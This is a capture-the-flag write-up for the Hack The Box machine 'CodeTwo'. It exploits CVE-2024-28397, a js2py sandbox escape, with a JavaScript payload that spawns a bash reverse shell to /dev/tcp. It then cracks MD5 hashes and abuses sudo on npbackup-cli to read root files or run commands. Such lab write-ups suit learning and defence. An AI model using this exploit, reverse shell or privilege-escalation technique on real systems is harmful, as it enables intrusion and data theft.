---
title: CodeTwo [Easy]
date: 2025-08-17
tags: [htb, linux, nmap, db, flask, js2py, cve-2024-28397, npbackup, sandbox-escape, crack]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/codetwo-htb-release-area-machine
image: /assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_banner.png
---

# CodeTwo HTB Release Area Machine
## Machine information
Author: [FisMatHack](https://app.hackthebox.com/users/1076236)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.58.119
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 09:16 EDT
Nmap scan report for 10.129.58.119
Host is up (0.47s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.80 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.58.119     codetwo.htb
```

Here we have port 8000, let's check it out.

### Web Enumeration
Check out the website at `http://codetwo.htb:8000`.

![CodeTwo Website](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_website.png)

We can see there is register, login and download app button. <br>
&rarr; Let's register a new account.

![CodeTwo Register](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_register.png)

And then login.

![CodeTwo Login](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_login.png)

![CodeTwo Dashboard](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_dashboard.png)

After login, there is a dashboard where we can logout, also add our javascript code to run and save it. <br>
&rarr; Let's back to the download app and see what we can do.

![CodeTwo Download App](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_download_app.png)

```bash
└─$ tree .
.
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html

6 directories, 11 files
```

After unzip `app.zip`, there is a list of folders and files.

### Code Analysis
What hit our mind is the `users.db` file.

```bash
└─$ sqlite3 users.db                                                                         
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
sqlite> .tables
code_snippet  user        
sqlite> SELECT * FROM user;
sqlite> SELECT * FROM code_snippet;
```

We got nothing, let's check the `app.py` file.

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

Here, we can see some other endpoints and the logic of the app.

```python
@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)
```

From this, we can see the pattern of the app directory but what we curious more is this part.

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

This one run in POST request, it use `js2py` library to run the code. The problem here is that user can send any javascript code to run. <br>
&rarr; Check out the `js2py` version from `requirements.txt` file.

```txt
js2py==0.74
```

Gonna search for vulnerability and found out this [CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397).

### CVE-2024-28397
Also found out the [POC](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py) so we gonna exploit to sandbox escape.

First we will setup listerner to catch the reverse shell.

```bash
└─$ penelope -p 3333      
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Then we gonna modify the `poc.py` for reverse shell.

```javascript
// Bash reverse shell
var hacked = Object.getOwnPropertyNames({});
var attr = hacked.__getattribute__;
var obj = attr("__getattribute__")("__class__").__base__;

function findPopen(o) {
    try {
        var subs = o.__subclasses__();
        for (var i = 0; i < subs.length; i++) {
            var item = subs[i];
            if (item && item.__module__ === "subprocess" && item.__name__ === "Popen") {
                return item;
            }
        }
    } catch(e) {}
    return null;
}

var Popen = findPopen(obj);
if (Popen) {
    var cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.36/3333 0>&1'";
    Popen(cmd, -1, null, -1, -1, -1, null, null, true);
}
```

After that, we gonna copy and paste this to the code editor in the dashboard.

![CodeTwo Run Code](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_run_code.png)

Click and *Run Code* button.

```bash
└─$ penelope -p 3333      
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from codetwo~10.129.58.119-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/codetwo~10.129.58.119-Linux-x86_64/2025_08_17-09_52_15-632.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
app@codetwo:~/app$ pwd
/home/app/app
```

Got our reverse shell, let's double check again the `users.db` file.

### Database & Cracking

```bash
app@codetwo:~/app$ ls -la
total 32
drwxrwxr-x 6 app app 4096 Feb 23 05:18 .
drwxr-x--- 5 app app 4096 Apr  6 03:22 ..
-rw-r--r-- 1 app app 3675 Feb  1  2025 app.py
drwxrwxr-x 2 app app 4096 Aug 17 13:24 instance
drwxr-xr-x 2 app app 4096 Feb  1  2025 __pycache__
-rw-rw-r-- 1 app app   49 Jan 17  2025 requirements.txt
drwxr-xr-x 4 app app 4096 Jun 11 07:51 static
drwxr-xr-x 2 app app 4096 Jun 26 13:43 templates
app@codetwo:~/app$ cd instance
app@codetwo:~/app/instance$ ls -la
total 24
drwxrwxr-x 2 app app  4096 Aug 17 13:24 .
drwxrwxr-x 6 app app  4096 Feb 23 05:18 ..
-rw-r--r-- 1 app app 16384 Aug 17 13:24 users.db
```

```bash
app@codetwo:~/app/instance$ sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
code_snippet  user        
sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|2fa0n|3bce3bd3f7aae8de66198193cd696a35
```

There are some hash, let's crack it. <br>
&rarr; We gonna use [CrackStation](https://crackstation.net/) to crack them.

![CodeTwo CrackStation](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_crackstation.png)

BOOM! We got password for `marco` user.
&rarr; `marco:sweetangelbabylove`.


We can either switch to `marco` in the `app` session or just ssh directly.

```bash
app@codetwo:~/app/instance$ su - marco
Password: 
marco@codetwo:~$ ls -la
total 44
drwxr-x--- 6 marco marco 4096 Aug 17 14:00 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6 03:50 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6 04:02 .cache
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18 11:16 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Aug 17 13:15 user.txt
marco@codetwo:~$ cat user.txt
2088bb4c1b24cc791705fb6c04dfef16
```

```bash
└─$ ssh marco@10.129.58.119 
marco@10.129.58.119's password: 
marco@codetwo:~$ ls -la
total 44
drwxr-x--- 6 marco marco 4096 Aug 17 14:00 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6 03:50 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6 04:02 .cache
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18 11:16 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Aug 17 13:15 user.txt
marco@codetwo:~$ cat user.txt
2088bb4c1b24cc791705fb6c04dfef16
```

Grab the `user.txt` flag.

## Initial Access
After initial access, we gonna check the `sudo` permission.

### Sudo Permission
```bash
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

We can see that we can run `npbackup-cli` with sudo without password.

### npbackup-cli
Found this [npbackup](https://github.com/netinvent/npbackup) project, but seems there is nothing to do with this.

```bash
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli
2025-08-17 14:08:22,968 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 14:08:22,969 :: CRITICAL :: Cannot run without configuration file.
2025-08-17 14:08:22,977 :: INFO :: ExecTime = 0:00:00.011763, finished, state is: critical.
```

After running, we got error due to missing configuration file. <br>
&rarr; If we roll back we can see there is a `npbackup.conf` file in `marco` directory.

```bash
marco@codetwo:~$ ls -la
total 44
drwxr-x--- 6 marco marco 4096 Aug 17 14:00 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6 03:50 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6 04:02 .cache
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18 11:16 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Aug 17 13:15 user.txt
```

```bash
-rw-rw-r-- 1 root  root  2893 Jun 18 11:16 npbackup.conf
```

Let's run again.

```bash
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b -f
2025-08-17 14:09:47,134 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 14:09:47,176 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-08-17 14:09:47,192 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-08-17 14:09:48,859 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-08-17 14:09:48,859 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-08-17 14:09:48,859 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-08-17 14:09:48,859 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-08-17 14:09:48,859 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-08-17 14:09:48,860 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-08-17 14:09:48,860 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-08-17 14:09:48,860 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-08-17 14:09:48,860 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
using parent snapshot 35a4dac3

Files:           0 new,     4 changed,     8 unmodified
Dirs:            0 new,     7 changed,     2 unmodified
Added to the repository: 24.053 KiB (14.723 KiB stored)

processed 12 files, 48.910 KiB in 0:00
snapshot a3e0e9d7 saved
2025-08-17 14:09:50,445 :: INFO :: Backend finished with success
2025-08-17 14:09:50,448 :: INFO :: Processed 48.9 KiB of data
2025-08-17 14:09:50,448 :: ERROR :: Backup is smaller than configured minmium backup size
2025-08-17 14:09:50,449 :: ERROR :: Operation finished with failure
2025-08-17 14:09:50,449 :: INFO :: Runner took 3.258563 seconds for backup
2025-08-17 14:09:50,450 :: INFO :: Operation finished
2025-08-17 14:09:50,458 :: INFO :: ExecTime = 0:00:03.326746, finished, state is: errors.
```

> *For the option, we can use `--help` to see the usage.*

It seems like there is some errors, let's check the `npbackup.conf` file.

```bash
marco@codetwo:~$ cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

So this file will backup the `/home/app/app`, we gonna leverage this point to change it to `/root` directory.

## Privilege Escalation
After changing, it gonna be like this.

```bash
paths:
-      - /home/app/app/
+      - /root/
```

The other thing we will keep the same and save as `malicious.conf`. To ensure it working well, we gonna do this in `/tmp` directory.

```bash
marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c malicious.conf -b
2025-08-17 14:38:22,422 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 14:38:22,464 :: INFO :: Loaded config E1057128 in /tmp/malicious.conf
2025-08-17 14:38:22,481 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-08-17 14:38:25,272 :: INFO :: Snapshots listed successfully
2025-08-17 14:38:25,274 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2025-08-17 14:38:25,274 :: INFO :: Runner took 2.792595 seconds for has_recent_snapshot
2025-08-17 14:38:25,274 :: INFO :: Running backup of ['/root'] to repo default
2025-08-17 14:38:26,390 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-08-17 14:38:26,390 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-08-17 14:38:26,390 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-08-17 14:38:26,390 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-08-17 14:38:26,391 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-08-17 14:38:26,391 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-08-17 14:38:26,391 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-08-17 14:38:26,391 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-08-17 14:38:26,391 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.887 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot c010518e saved
2025-08-17 14:38:27,987 :: INFO :: Backend finished with success
2025-08-17 14:38:27,990 :: INFO :: Processed 197.7 KiB of data
2025-08-17 14:38:27,991 :: ERROR :: Backup is smaller than configured minmium backup size
2025-08-17 14:38:27,991 :: ERROR :: Operation finished with failure
2025-08-17 14:38:27,991 :: INFO :: Runner took 5.511554 seconds for backup
2025-08-17 14:38:27,992 :: INFO :: Operation finished
2025-08-17 14:38:28,001 :: INFO :: ExecTime = 0:00:05.582843, finished, state is: errors.
```

We can see there is a snapshot ID has been saved, we can double check it by using `-s` option.

```bash
marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c malicious.conf -s
2025-08-17 14:38:44,582 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 14:38:44,623 :: INFO :: Loaded config E1057128 in /tmp/malicious.conf
2025-08-17 14:38:44,641 :: INFO :: Listing snapshots of repo default
ID        Time                 Host        Tags        Paths          Size
---------------------------------------------------------------------------------
35a4dac3  2025-04-06 03:50:16  codetwo                 /home/app/app  48.295 KiB
c010518e  2025-08-17 14:38:26  codetwo                 /root          197.660 KiB
---------------------------------------------------------------------------------
2 snapshots
2025-08-17 14:38:47,657 :: INFO :: Snapshots listed successfully
2025-08-17 14:38:47,658 :: INFO :: Runner took 3.017154 seconds for snapshots
2025-08-17 14:38:47,658 :: INFO :: Operation finished
2025-08-17 14:38:47,666 :: INFO :: ExecTime = 0:00:03.087586, finished, state is: success.
```

Now we just need to dump the file we want.

```bash
marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c malicious.conf --dump /root/root.txt
ec295dc17c45034def14dde32d1dcdd6
```

There we go, we got the `root.txt` flag.

There is also other way to escalate to root by manipulating the `post_exec_commands: []` to add command to run.

```bash
post_exec_commands:
        - "mkdir -p /tmp/flag"
        - "cp /root/root.txt /tmp/flag/root.txt 2>/dev/null || true"
        - "chmod 644 /tmp/flag/root.txt"
        - "chown marco:marco /tmp/flag/root.txt"
```

We just save and run again then we can grab the flag also.

![result](/assets/img/codetwo-htb-release-area-machine/result.png)